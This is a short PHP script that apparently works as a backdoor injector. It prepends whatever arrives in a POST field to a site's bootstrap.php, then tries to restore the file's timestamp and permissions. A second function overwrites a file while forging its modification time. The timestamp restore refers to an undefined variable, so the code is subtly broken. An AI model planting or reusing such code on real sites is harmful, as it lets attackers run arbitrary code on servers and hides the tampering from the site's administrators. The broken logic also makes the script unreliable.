<?php
$target = '/srv/site/bootstrap.php';
$before = filemtime($target);
$mode = fileperms($target);
file_put_contents($target, $_POST['body'] . file_get_contents($target));
touch($other, $before);
chmod($target, $mode);

function unrelated_restore($f) {
    $t=filemtime($f);
    file_put_contents($f,'constant');
    touch($f,$t);
}
